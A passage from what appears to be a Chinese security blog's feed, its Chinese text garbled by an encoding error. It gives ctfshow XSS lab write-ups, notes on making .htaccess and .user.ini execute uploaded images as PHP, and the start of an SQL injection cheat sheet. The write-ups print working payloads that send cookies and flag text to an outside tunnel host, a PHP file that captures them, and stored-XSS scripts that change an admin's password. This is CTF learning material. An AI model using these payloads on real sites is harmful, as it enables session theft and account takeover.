<p>5ã€åœ¨è®¿é—®é‡æå¤§çš„ä¸€äº›é¡µé¢ä¸Šçš„ XSS å¯ä»¥æ”»å‡»ä¸€äº›å°å‹ç½‘ç«™ï¼Œå®ç° DDoS æ”»å‡»çš„æ•ˆæœã€‚</p>
</blockquote>
<h2 id="web316"><a href="#web316" class="headerlink" title="web316"></a>web316</h2><p>ä½¿ç”¨<strong>cpolar</strong>è¿›è¡Œå†…ç½‘ç©¿é€ã€‚<br>æœ¬åœ°å†™å…¥xss.php</p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span> 
<span class="token variable">$flag</span><span class="token operator">=</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'c'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
<span class="token variable">$file</span><span class="token operator">=</span><span class="token function">fopen</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'flag.txt'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'w+'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token function">fwrite</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">,</span><span class="token variable">$flag</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token function">fclose</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token delimiter important">?></span></span>
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>è¿™ä¸€é¢˜è¾“å…¥ <code>&lt;script&gt;windows.location.href=&#39;http://1f72xxx3.r3.cpolar.top/xss.php?c=&#39;+document.cookie&lt;/script&gt;</code>ä¸åŠ windowä¹Ÿå¯ä»¥ã€‚<br>æœ¬åœ°å¾—åˆ°flagã€‚<br>è¿˜æœ‰<code>&lt;script&gt;window.open(&#39;http://ip/&#39;+document.cookie)&lt;/script&gt;</code><br><code>&lt;svg onload=&quot;window.open(&#39;http://xxx/&#39;+document.cookie)&quot;&gt;</code><br><code>&lt;iframe onload=&quot;window.open(&#39;http://1xxx/&#39;+document.cookie)&quot;&gt;&lt;/iframe&gt;</code></p>
<blockquote>
<p>Window open() æ–¹æ³•<br>open() æ–¹æ³•ç”¨äºæ‰“å¼€ä¸€ä¸ªæ–°çš„æµè§ˆå™¨çª—å£æˆ–æŸ¥æ‰¾ä¸€ä¸ªå·²å‘½åçš„çª—å£ã€‚ </p>
</blockquote>
<p><img src="https://img-blog.csdnimg.cn/74a587fe2e1a4b1091feeeda46152723.png" alt="1"></p>
<h2 id="web317"><a href="#web317" class="headerlink" title="web317"></a>web317</h2><p>è¿›è¡Œäº†è¿‡æ»¤ï¼Œ<code>&lt;script&gt;</code>è¿›è¡Œäº†è¿‡æ»¤ã€‚é‚£å°±ä½¿ç”¨<code>&lt;body&gt;</code><br><code>&lt;body onload=&quot;window.location.href=&#39;http://1f72eccc63.r3.cpolar.top/xss.php?c=&#39;+document.cookie&quot;&gt;</code><br>æœ¬åœ°å¾—åˆ°flagã€‚</p>
<h2 id="web318"><a href="#web318" class="headerlink" title="web318"></a>web318</h2><p>è¿‡æ»¤img</p>
<h2 id="web320-322"><a href="#web320-322" class="headerlink" title="web320-322"></a>web320-322</h2><p>è¿‡æ»¤äº†<strong>ç©ºæ ¼</strong>é‡‡ç”¨&#x2F;**&#x2F;</p>
<h2 id="web-323-326"><a href="#web-323-326" class="headerlink" title="web 323-326"></a>web 323-326</h2><p>è¿‡æ»¤äº†xssï¼ŒæŠŠæœ¬åœ°çš„æ¥æ”¶æ–‡ä»¶ï¼ˆ<strong>xss.php</strong>ï¼‰æ”¹ä¸º<strong>x.php</strong></p>
<p>ä»¥ä¸Šéƒ½æ˜¯åå°„å‹ï¼Œæ¥ä¸‹æ¥æ˜¯<strong>å­˜å‚¨å‹</strong>ã€‚</p>
<h2 id="web327"><a href="#web327" class="headerlink" title="web327"></a>web327</h2><p><code>&lt;body onload=&quot;window.location.href=&#39;http://1f72ffec63.r3.cpolar.top/xss.php?c=&#39;+document.cookie&quot;&gt;</code><br>éœ€æ³¨æ„æ”¶ä»¶äººå¿…é¡»æ˜¯adminã€‚</p>
<h2 id="web328"><a href="#web328" class="headerlink" title="web328"></a>web328</h2><p>ç”¨æˆ·ç®¡ç†å¤„æ˜¾ç¤ºæˆ‘ä»¬ä¸æ˜¯admin<br><img src="https://img-blog.csdnimg.cn/df99dac33016489fab135c338cb89030.png" alt="1"><br>æ‰€ä»¥æˆ‘ä»¬æ³¨å†Œä¸€ä¸ªç”¨æˆ·è¿›è¡Œxssï¼Œå› ä¸ºåœ¨æ³¨å†Œç”¨æˆ·æ—¶ä¼šæŠŠè´¦æˆ·å¯†ç å­˜å‚¨èµ·æ¥ï¼Œå½“ç®¡ç†å‘˜æ‰“å¼€é¡µé¢æ—¶ä¼šè¿›è¡Œæ”»å‡»å¹¶ä¸”å¾—åˆ°cookieã€‚</p>
<p><img src="https://img-blog.csdnimg.cn/e20c9afd03ac4145ae80e7d5fd32c59d.png" alt="2"><br>å¯†ç ä¸ºï¼š<code>&lt;script&gt;document.location.href=&#39;http://1f72ec63.r3.cpolar.top/x.php?c=&#39;+document.cookie&lt;/script&gt;</code>è¿‡ä¸€æ®µæ—¶é—´åæœ¬åœ°æ–‡ä»¶ä¼šå¾—åˆ°cookie<br><img src="https://img-blog.csdnimg.cn/b1fc82f156f840fdb7f7a2c13fe9ece0.png" alt="3"><br>è¿›å…¥ç”¨æˆ·ç®¡ç†é¡µé¢æ²¡æ‰¾åˆ°flagã€‚ç”¨burpæŠ“åŒ…è¯•è¯•ã€‚<br><img src="https://img-blog.csdnimg.cn/66ded499169947dcb2ea50d53888a948.png" alt="5"></p>
<h2 id="web329"><a href="#web329" class="headerlink" title="web329"></a>web329</h2><p>ä¸Šé¢˜çš„æ€è·¯ä¸èƒ½ç”¨äº†ï¼Œå‘ç°adminçš„cookieä¼šæ”¹å˜ï¼Œä½¿ç”¨åå°±ä¸èƒ½ç”¨äº†ã€‚<br>çœ‹äº†å¸ˆå‚…ä»¬æ–‡ç« ï¼Œå€Ÿé‰´ä¸€ä¸‹ï¼š</p>
<pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token operator">&lt;</span>script<span class="token operator">></span>
<span class="token function">$</span><span class="token punctuation">(</span><span class="token string">'.laytable-cell-1-0-1'</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">each</span><span class="token punctuation">(</span><span class="token keyword">function</span><span class="token punctuation">(</span><span class="token parameter">index<span class="token punctuation">,</span>value</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
	<span class="token keyword">if</span><span class="token punctuation">(</span>value<span class="token punctuation">.</span>innerText<span class="token punctuation">.</span><span class="token function">indexOf</span><span class="token punctuation">(</span><span class="token string">'ctfshow&#123;'</span><span class="token punctuation">)</span><span class="token operator">></span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span>
	<span class="token punctuation">&#123;</span>location<span class="token punctuation">.</span>href<span class="token operator">=</span><span class="token string">'http://1f72ec63.r3.cpolar.top/x.php?c='</span><span class="token operator">+</span>value<span class="token punctuation">.</span>innerText<span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token operator">&lt;</span><span class="token operator">/</span>script<span class="token operator">></span>
<span class="token comment">/*è¯¥ JavaScript ä»£ç ä¸­çš„ä¸»è¦åŠŸèƒ½æ˜¯åœ¨å½“å‰ç½‘é¡µä¸­æŸ¥æ‰¾æ‰€æœ‰ç±»åä¸ºâ€œlaytable-cell-1-0-1â€çš„
å…ƒç´ ã€‚ä½¿ç”¨ jQuery åº“ä¸­çš„ each() å‡½æ•°è¿­ä»£è¿™äº›å…ƒç´ ï¼Œå¯¹æ¯ä¸ªå…ƒç´ æ‰§è¡Œä»¥ä¸‹æ“ä½œï¼š
ä½¿ç”¨ indexOf() å‡½æ•°æ£€æŸ¥è¯¥å…ƒç´ ä¸­çš„æ–‡æœ¬æ˜¯å¦åŒ…å«â€œctfshow&#123;â€å­—ç¬¦ä¸²ï¼Œå¦‚æœåŒ…å«åˆ™æ‰§è¡Œä¸‹ä¸€æ­¥ï¼Œ
å¦åˆ™ä¸åšä»»ä½•æ“ä½œã€‚

æ„é€ ä¸€ä¸ª URLï¼Œå…¶ä¸­â€œhttp://ip/x.php?cookie=â€æ˜¯ç›®æ ‡ç½‘ç«™çš„ URLï¼Œè€Œ value.innerText
 æ˜¯åŒ…å«â€œctfshow&#123;â€å­—ç¬¦ä¸²çš„å…ƒç´ çš„æ–‡æœ¬å†…å®¹ï¼Œå°†è¯¥æ–‡æœ¬ä½œä¸ºå‚æ•°æ·»åŠ åˆ° URL æœ«å°¾ã€‚

ä½¿ç”¨ location.href è·³è½¬åˆ°æ–°çš„ URL é¡µé¢ã€‚


"laytable-cell-1-0-1" æ˜¯ä¸€ä¸ª HTML å…ƒç´ çš„ç±»åï¼ˆclass nameï¼‰ï¼Œç”¨äºæ ‡è¯†è¯¥å…ƒç´ å±äºä¸€ä¸ª
è¡¨æ ¼ï¼ˆtableï¼‰ä¸­çš„ä¸€ä¸ªå•å…ƒæ ¼ï¼ˆcellï¼‰ã€‚é€šå¸¸æƒ…å†µä¸‹ï¼Œä¸€ä¸ªè¡¨æ ¼ä¸­çš„å•å…ƒæ ¼éƒ½å…·æœ‰ç±»ä¼¼çš„ç±»åï¼Œä¾‹
å¦‚â€œlaytable-cell-1-0-2â€ã€â€œlaytable-cell-1-1-0â€ç­‰ç­‰ï¼Œå…¶ä¸­çš„æ•°å­—è¡¨ç¤ºå•å…ƒæ ¼åœ¨è¡¨æ ¼ä¸­çš„
è¡Œåˆ—ä½ç½®ã€‚è¯¥ç±»åå¯èƒ½æ˜¯ç”±æŸä¸ªå‰ç«¯æ¡†æ¶æˆ–åº“è‡ªåŠ¨ç”Ÿæˆçš„ï¼Œç”¨äºå¯¹è¡¨æ ¼è¿›è¡Œæ ·å¼è®¾ç½®æˆ– JavaScript 
æ“ä½œã€‚åœ¨ç»™å®šçš„ JavaScript ä»£ç ä¸­ï¼Œè¯¥ç±»åè¢«ç”¨äºæŸ¥æ‰¾åŒ…å«ç‰¹å®šå­—ç¬¦ä¸²çš„å•å…ƒæ ¼å¹¶æ‰§è¡Œç›¸å…³æ“ä½œã€‚
*/</span>
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<blockquote>
<p>è¿™æ˜¯ä¸€æ®µ JavaScript ä»£ç ï¼Œå…¶ä½œç”¨æ˜¯åœ¨å½“å‰ç½‘é¡µä¸­å¯»æ‰¾æ‰€æœ‰ç±»åä¸ºâ€œlaytable-cell-1-0-1â€çš„å…ƒç´ ï¼Œå¦‚æœè¿™äº›å…ƒç´ ä¸­çš„æ–‡æœ¬åŒ…å«â€œctfshow{â€ï¼Œé‚£ä¹ˆå°†è·³è½¬åˆ°â€œ<a href="http://ip/x.php?cookie=%E2%80%9D+value.innerText">http://ip/x.php?cookie=â€+value.innerText</a> çš„é¡µé¢ï¼Œå…¶ä¸­ value.innerText æ˜¯åŒ…å«â€œctfshow{â€æ–‡æœ¬çš„å…ƒç´ çš„æ–‡æœ¬å†…å®¹ã€‚è¯·æ³¨æ„ï¼Œè¯¥ä»£ç å¯èƒ½ä¼šå¯¹ç”¨æˆ·çš„è®¡ç®—æœºæˆ–ç½‘ç»œé€ æˆæ½œåœ¨çš„å®‰å…¨é£é™©ï¼Œåº”ä»…åœ¨å®‰å…¨ç¯å¢ƒä¸­è¿è¡Œã€‚</p>
</blockquote>
<p>æ³¨å†Œä¸€ä¸ªæ–°ç”¨æˆ· å¯†ç å¡«å…¥payload<br><code>&lt;script&gt; $(&#39;.laytable-cell-1-0-1&#39;).each(function(index,value)&#123;     if(value.innerText.indexOf(&#39;ctfshow&#123;&#39;)&gt;-1)     &#123;location.href=&#39;http://1f72ec63.r3.cpolar.top/x.php?c=&#39;+value.innerText&#125; &#125;); &lt;/script&gt;</code><br>ä¸€æ®µæ—¶å€™å¾—åˆ°flagã€‚<br><img src="https://img-blog.csdnimg.cn/f5598608d95847fb9ae9c8d93ed5c14e.png" alt="2"></p>
<h3 id="web330"><a href="#web330" class="headerlink" title="web330"></a>web330</h3><p>æœ¬é¢˜å¤šäº†ä¸€ä¸ªä¿®æ”¹å¯†ç çš„é€‰é¡¹ï¼ŒæŠ“åŒ…çœ‹çœ‹ã€‚å­˜åœ¨ä¸€ä¸ªapiæ¥å£ã€‚<br><img src="https://img-blog.csdnimg.cn/466be17549174dadbe636ff9ea1c7206.png" alt="1"><br>æˆ‘ä»¬å¯ä»¥å†åˆ›å»ºä¸€ä¸ªç”¨æˆ·ï¼Œuserä¸ºpayloadä¹Ÿå°±æ˜¯<code>&lt;script&gt;window.location.href=&#39;http://127.0.0.1/api/change.php?p=asdd&#39;&lt;/script&gt;</code><br>è¿™æ—¶å½“æˆ‘ä»¬ç™»é™†æ—¶å°±æ˜¯ç®¡ç†å‘˜èº«ä»½ã€‚<br><img src="https://img-blog.csdnimg.cn/7dab5e3fba604f1494dc8156c0c6ebca.png" alt="2"></p>
<h3 id="web331"><a href="#web331" class="headerlink" title="web331"></a>web331</h3><p>æŠ“åŒ…å‘ç°è¦ä½¿ç”¨postè¯·æ±‚ï¼Œä¸å¤ªæ‡‚jsã€‚ç½‘ä¸Šæœä¸€ä¸‹ä½¿ç”¨jså‘é€httpè¯·æ±‚ã€‚<br>æ¨èä¸€ä¸ªæ–¹æ³•ï¼š</p>
<h4 id="XMLHttpRequest"><a href="#XMLHttpRequest" class="headerlink" title="XMLHttpRequest()"></a>XMLHttpRequest()</h4><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">var</span> httpRequest <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">XMLHttpRequest</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//ç¬¬ä¸€æ­¥ï¼šåˆ›å»ºéœ€è¦çš„å¯¹è±¡</span>
httpRequest<span class="token punctuation">.</span><span class="token function">open</span><span class="token punctuation">(</span><span class="token string">'POST'</span><span class="token punctuation">,</span> <span class="token string">'url'</span><span class="token punctuation">,</span> <span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//ç¬¬äºŒæ­¥ï¼šæ‰“å¼€è¿æ¥</span>
httpRequest<span class="token punctuation">.</span><span class="token function">setRequestHeader</span><span class="token punctuation">(</span><span class="token string">"Content-type"</span><span class="token punctuation">,</span><span class="token string">"application/x-www-form-urlencoded"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//è®¾ç½®è¯·æ±‚å¤´ æ³¨ï¼špostæ–¹å¼å¿…é¡»è®¾ç½®è¯·æ±‚å¤´ï¼ˆåœ¨å»ºç«‹è¿æ¥åè®¾ç½®è¯·æ±‚å¤´ï¼‰</span>
httpRequest<span class="token punctuation">.</span><span class="token function">send</span><span class="token punctuation">(</span><span class="token string">'name=teswe&amp;ee=ef'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//å‘é€è¯·æ±‚ å°†æƒ…å¤´ä½“å†™åœ¨sendä¸­</span>
<span class="token comment">/**
 * è·å–æ•°æ®åçš„å¤„ç†ç¨‹åº
 */</span>
httpRequest<span class="token punctuation">.</span><span class="token function-variable function">onreadystatechange</span> <span class="token operator">=</span> <span class="token keyword">function</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token comment">//è¯·æ±‚åçš„å›è°ƒæ¥å£ï¼Œå¯å°†è¯·æ±‚æˆåŠŸåè¦æ‰§è¡Œçš„ç¨‹åºå†™åœ¨å…¶ä¸­</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span>httpRequest<span class="token punctuation">.</span>readyState <span class="token operator">==</span> <span class="token number">4</span> <span class="token operator">&amp;&amp;</span> httpRequest<span class="token punctuation">.</span>status <span class="token operator">==</span> <span class="token number">200</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token comment">//éªŒè¯è¯·æ±‚æ˜¯å¦å‘é€æˆåŠŸ</span>
        <span class="token keyword">var</span> json <span class="token operator">=</span> httpRequest<span class="token punctuation">.</span>responseText<span class="token punctuation">;</span><span class="token comment">//è·å–åˆ°æœåŠ¡ç«¯è¿”å›çš„æ•°æ®</span>
        console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>json<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span><span class="token punctuation">;</span>
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>æ³¨å†Œuser å’Œpasswordçš„payloadï¼Œè®¿é—®ç”¨æˆ·ç®¡ç†é¡µé¢å³å¯å¾—åˆ°flagã€‚</p>
<pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token operator">&lt;</span>script<span class="token operator">></span>
<span class="token keyword">var</span> httpRequest <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">XMLHttpRequest</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
httpRequest<span class="token punctuation">.</span><span class="token function">open</span><span class="token punctuation">(</span><span class="token string">'POST'</span><span class="token punctuation">,</span> <span class="token string">'http://127.0.0.1/api/change.php'</span><span class="token punctuation">,</span><span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
httpRequest<span class="token punctuation">.</span><span class="token function">setRequestHeader</span><span class="token punctuation">(</span><span class="token string">"Content-type"</span><span class="token punctuation">,</span><span class="token string">"application/x-www-form-urlencoded"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
httpRequest<span class="token punctuation">.</span><span class="token function">send</span><span class="token punctuation">(</span><span class="token string">'p=1234567'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token operator">&lt;</span><span class="token operator">/</span>script<span class="token operator">></span>
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p><img src="https://img-blog.csdnimg.cn/8ab67c81294a4c38ba416d389eb32f4d.png" alt="2"></p>
]]></content>
      <categories>
        <category>ctfshow</category>
      </categories>
      <tags>
        <tag>XSS</tag>
      </tags>
  </entry>
  <entry>
    <title>.htaccess å’Œ.user.ini</title>
    <url>/2023/02/21/htaccess-%E5%92%8C-user-ini/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><meta name="referrer" content="no-referrer"/>

<h3 id="htaccess"><a href="#htaccess" class="headerlink" title=".htaccess"></a>.htaccess</h3><p>httpd-conf æ˜¯ Apache çš„ç³»ç»Ÿé…ç½®æ–‡ä»¶ï¼Œä¸€ä¸ªå…¨å±€çš„é…ç½®æ–‡ä»¶ï¼Œå¯¹æ•´ä¸ª web æœåŠ¡èµ·ä½œç”¨ï¼›è€Œ.htaccess ä¹Ÿæ˜¯ Apache çš„é…ç½®æ–‡ä»¶ï¼Œä¸è¿‡ç›¸å½“äºä¸€ä¸ªå±€éƒ¨é…ç½®æ–‡ä»¶ï¼Œåªå¯¹è¯¥æ–‡ä»¶æ‰€åœ¨ç›®å½•ä¸‹çš„æ–‡ä»¶èµ·ä½œç”¨ã€‚</p>
<h4 id="å®ä¾‹"><a href="#å®ä¾‹" class="headerlink" title="å®ä¾‹"></a>å®ä¾‹</h4><p>åœ¨ç»•è¿‡æ–‡ä»¶ä¸Šä¼ çš„é™åˆ¶ä¸­ï¼Œé€šå¸¸åœ¨ Apache å…¨å±€é…ç½®æ–‡ä»¶ httpd.conf ä¸­æœ‰è¿™æ ·ä¸€æ¡é…ç½®ï¼š</p>
<pre class="line-numbers language-none"><code class="language-none">AddType application&#x2F;x-httpd-php .php .phtml<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>







<p>è¿™æ¡é…ç½®çš„æ„æ€å°±æ˜¯å°†.phpã€.phtml æ–‡ä»¶åç¼€çš„æ–‡ä»¶å½“åš php æ–‡ä»¶æ‰§è¡Œï¼Œå¦‚æœå¼€å¯äº†è¿™æ¡é…ç½®ï¼Œå°±å¯ä»¥ä¸Šä¼ .phtml æ–‡ä»¶åœ¨æ‰§è¡Œ  php ä»£ç ï¼Œè¿™ä¹Ÿå°±æ˜¯ä¸ºä»€ä¹ˆåœ¨æ–‡ä»¶ä¸Šä¼ æ—¶å¯ä»¥å°è¯•ä¸Šä¼ .phtmlï¼Œä¸è¿‡åœ¨é«˜ç‰ˆæœ¬ä¸­è¿™æ¡é…ç½®é»˜è®¤æ˜¯å…³é—­çš„ï¼Œä¹Ÿå°±æ˜¯åªèƒ½è§£æ.php æ–‡ä»¶åç¼€ã€‚  </p>
<p>æˆ–è€…è¿™æ¡é…ç½®ï¼š</p>
<pre class="line-numbers language-none"><code class="language-none">SetHandler application&#x2F;x-httpd-php<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>



<p>å°†æ‰€æœ‰æ–‡ä»¶éƒ½è§£æä¸º php æ–‡ä»¶ã€‚  </p>
<p>é€šå¸¸å…¨å±€æ–‡ä»¶æˆ‘ä»¬éƒ½æ˜¯ä¸å¯æ›´æ”¹çš„ï¼Œè€Œ Apache è¿˜æœ‰ä¸€ä¸ªå±€éƒ¨é…ç½®æ–‡ä»¶.htaccessï¼Œè¿™ä¸ªé…ç½®æ–‡ä»¶åªå¯¹è¯¥ç›®å½•æ‰€åœ¨çš„ web ç›®å½•èµ·ä½œç”¨ï¼Œä¾‹å¦‚ï¼šæˆ‘ä»¬åœ¨ www ç›®å½•ä¸‹æœ‰ä¸€ä¸ª.htaccess é…ç½®æ–‡ä»¶ï¼Œé…ç½®å†…å®¹ä¸º <code>AddType application/x-httpd-php .jpg</code> ï¼Œå°† jpg æ–‡ä»¶å½“åš PHP æ–‡ä»¶è§£æã€‚è¿™æ ·å°±å¯ä»¥ç›´æ¥è§£æ jpg åç¼€çš„ webshellã€‚</p>
<pre class="line-numbers language-none"><code class="language-none">&#x2F;&#x2F; .htaccessAddType application&#x2F;x-httpd-php .jpg&#x2F;&#x2F; 1.jpg&lt;?php phpinfo();?&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>



<p>è®¿é—® 1.jpgï¼Œå½“åš PHP è§£æã€‚  </p>
<h4 id="å±€é™"><a href="#å±€é™" class="headerlink" title="å±€é™"></a>å±€é™</h4><p>.htaccess é…ç½®æ–‡ä»¶åªåœ¨ Apache æœåŠ¡å™¨ä¸­èµ·ä½œç”¨ã€‚  </p>
<h3 id="user-ini"><a href="#user-ini" class="headerlink" title=".user.ini"></a>.user.ini</h3><p>php.ini æ˜¯ php çš„ä¸€ä¸ªå…¨å±€é…ç½®æ–‡ä»¶ï¼Œå¯¹æ•´ä¸ª web æœåŠ¡èµ·ä½œç”¨ï¼›è€Œ.user.ini å’Œ.htaccess ä¸€æ ·æ˜¯ç›®å½•çš„é…ç½®æ–‡ä»¶ï¼Œ.user.ini å°±æ˜¯ç”¨æˆ·è‡ªå®šä¹‰çš„ä¸€ä¸ª php.iniï¼Œé€šå¸¸ç”¨è¿™ä¸ªæ–‡ä»¶æ¥æ„é€ åé—¨å’Œéšè—åé—¨ã€‚</p>
<h4 id="å®ä¾‹-1"><a href="#å®ä¾‹-1" class="headerlink" title="å®ä¾‹"></a>å®ä¾‹</h4><p>php é…ç½®é¡¹ä¸­æœ‰ä¸¤ä¸ªé…ç½®å¯ä»¥èµ·åˆ°ä¸€äº›ä½œç”¨</p>
<pre class="line-numbers language-none"><code class="language-none">auto_prepend_file &#x3D; &lt;filename&gt;         &#x2F;&#x2F;åŒ…å«åœ¨æ–‡ä»¶å¤´auto_append_file &#x3D; &lt;filename&gt;          &#x2F;&#x2F;åŒ…å«åœ¨æ–‡ä»¶å°¾<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>



<p>è¿™ä¸¤ä¸ªé…ç½®é¡¹çš„ä½œç”¨ç›¸å½“äºä¸€ä¸ªæ–‡ä»¶åŒ…å«ï¼Œæ¯”å¦‚</p>
<pre class="line-numbers language-none"><code class="language-none">&#x2F;&#x2F; .user.iniauto_prepend_file &#x3D; 1.jpg&#x2F;&#x2F; 1.jpg&lt;?php phpinfo();?&gt;&#x2F;&#x2F; 11.php<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>



<p>ä¹Ÿå°±æ˜¯åœ¨ä¸€ä¸ªç›®å½•ä¸‹æœ‰.user.ini è¿™ä¸ªé…ç½®æ–‡ä»¶ï¼Œé…ç½®å†…å®¹ä¸ºä¸Šï¼Œæœ‰ 1.jpgï¼ŒåŒæ—¶è¯¥ç›®å½•ä¸‹è¿˜éœ€è¦æœ‰.php åç¼€çš„æ–‡ä»¶ï¼Œ<code>auto_prepend_file = 1.jpg</code> è¿™ä¸ªé…ç½®çš„æ„æ€å°±æ˜¯åœ¨å½“å‰ç›®å½•ä¸‹çš„.php æ–‡ä»¶åŒ…å« 1.jpg è¿™ä¸ªå›¾ç‰‡ï¼Œåœ¨æ­¤å¤„ç›¸å½“äºåœ¨ 11.php æ–‡ä»¶å¤´æ’å…¥äº† <code>require(&#39;1.jpg&#39;)</code> è¿™æ¡è¯­å¥ï¼Œä¹Ÿå°±æ˜¯è¯´ç›¸å½“äºæ–‡ä»¶åŒ…å«ã€‚<br>å¦ä¸€æ¡é…ç½®åŒ…å«åœ¨æ–‡ä»¶å°¾ï¼Œå¦‚æœé‡åˆ°äº† exit è¯­å¥çš„è¯å°±ä¼šå¤±æ•ˆã€‚</p>
<p>.user.ini ä½¿ç”¨èŒƒå›´å¾ˆå¹¿ï¼Œä¸ä»…é™äº Apache æœåŠ¡å™¨ï¼ŒåŒæ ·é€‚ç”¨äº Nginx æœåŠ¡å™¨ï¼Œåªè¦æœåŠ¡å™¨å¯ç”¨äº† fastcgi æ¨¡å¼ (é€šå¸¸éçº¿ç¨‹å®‰å…¨æ¨¡å¼ä½¿ç”¨çš„å°±æ˜¯ fastcgi æ¨¡å¼)ã€‚  </p>
<h4 id="å±€é™-1"><a href="#å±€é™-1" class="headerlink" title="å±€é™"></a>å±€é™</h4><p>åœ¨.user.ini ä¸­ä½¿ç”¨è¿™æ¡é…ç½®çš„ä½¿ç”¨ä¹Ÿè¯´äº†æ˜¯åœ¨åŒç›®å½•ä¸‹çš„å…¶ä»–.php æ–‡ä»¶ä¸­åŒ…å«é…ç½®ä¸­æ‰€æŒ‡å®šçš„æ–‡ä»¶ï¼Œä¹Ÿå°±æ˜¯è¯´éœ€è¦è¯¥ç›®å½•ä¸‹å­˜åœ¨.php æ–‡ä»¶ï¼Œé€šå¸¸åœ¨æ–‡ä»¶ä¸Šä¼ ä¸­ï¼Œä¸€èˆ¬æ˜¯ä¸“é—¨æœ‰ä¸€ä¸ªç›®å½•ç”¨æ¥å­˜åœ¨å›¾ç‰‡ï¼Œå¯èƒ½å°æ¦‚ç‡ä¼šå­˜åœ¨.php æ–‡ä»¶ã€‚  </p>
<p>ä½†æ˜¯æœ‰æ—¶å¯ä»¥ä½¿ç”¨ <code>../</code> æ¥å°†æ–‡ä»¶ä¸Šä¼ åˆ°å…¶ä»–ç›®å½•ï¼Œè¾¾åˆ°ä¸€ä¸ªåˆ©ç”¨çš„æ•ˆæœã€‚  </p>
]]></content>
      <categories>
        <category>çŸ¥è¯†ç‚¹</category>
      </categories>
      <tags>
        <tag>ctf</tag>
      </tags>
  </entry>
  <entry>
    <title>upload-labsé¢˜ç›®è§£æ</title>
    <url>/2023/02/20/upload-labs%E9%A2%98%E7%9B%AE%E8%A7%A3%E6%9E%90/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script>]]></content>
      <categories>
        <category>uploadfile</category>
      </categories>
      <tags>
        <tag>ctf</tag>
      </tags>
  </entry>
  <entry>
    <title>SQLæ³¨å…¥é€ŸæŸ¥è¡¨</title>
    <url>/2023/01/18/SQL%E6%B3%A8%E5%85%A5%E9%80%9F%E6%9F%A5%E8%A1%A8/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><meta name="referrer" content="no-referrer"/>

<h1 id="SQL-æ³¨å…¥é€ŸæŸ¥è¡¨"><a href="#SQL-æ³¨å…¥é€ŸæŸ¥è¡¨" class="headerlink" title="SQL æ³¨å…¥é€ŸæŸ¥è¡¨"></a>SQL æ³¨å…¥é€ŸæŸ¥è¡¨</h1><p>æ­¤<a href="https://portswigger.net/web-security/sql-injection">SQL æ³¨å…¥</a>é€ŸæŸ¥è¡¨åŒ…å«æœ‰ç”¨è¯­æ³•çš„ç¤ºä¾‹ï¼Œæ‚¨å¯ä»¥ä½¿ç”¨è¿™äº›ç¤ºä¾‹æ¥æ‰§è¡Œæ‰§è¡Œ SQL æ³¨å…¥æ”»å‡»æ—¶ç»å¸¸å‡ºç°çš„å„ç§ä»»åŠ¡ã€‚</p>
